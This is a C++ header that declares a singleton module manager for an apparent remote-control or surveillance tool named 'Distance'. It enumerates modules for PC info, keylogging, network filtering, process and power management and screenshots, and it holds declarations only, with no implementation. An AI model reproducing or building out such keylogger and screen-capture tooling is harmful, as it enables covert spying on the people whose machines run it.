#pragma once

#include <unordered_map>
#include <memory>
#include "DistanceModules.hpp"


namespace Distance
{

    /*
    * @brief The Module it is enumeration existing modules
    */
    
    enum class ModuleType : std::uint32_t
    {
        PcInfo,
        Keylogger,
        Netfilter,
        ProcessManager,
        PowerManager,
        Screenshot
    };
    


    class ModulesManager;
    namespace _internal
    {
        class ModulesManagerDestructor
        {
        public:
            void init(ModulesManager* manager);
            ~ModulesManagerDestructor();

        private:
            ModulesManager* manager_{};
        };

    }

    using ModulesList = std::unordered_map<ModuleType, std::shared_ptr<Module::IModule>>;

    /*
    * @brief The ModulesManager is controlling modules
    * @warning The ModulesManager is non thread safe
    */
    class ModulesManager
    {
    public:
        [[nodiscard]] static ModulesManager& invoke();
        void addModules(ModulesList modules);
        void runAll();
        void stopAll();
        void run(ModuleType mod);
        void stop(ModuleType mod);
        [[nodiscard]] std::shared_ptr<Module::IModule> getAccess(ModuleType mod) const;

    private:
        ModulesManager() = default;
        ~ModulesManager();

    private:
        ModulesList modules_{};
        
        static inline ModulesManager* manager_{};

        friend class _internal::ModulesManagerDestructor;
        static inline _internal::ModulesManagerDestructor destructor_;
    };

    /*
    * @brief The "CreateModules" creates all modules such as:
    * KeyloggerModule,
    * NetfilterModule,
    * ProcessManagerModule,
    * PowerManagerModule,
    * ScreenshotModule
    * @return List of all modules
    */
   [[nodiscard]] ModulesList CreateModules();

} // Distance
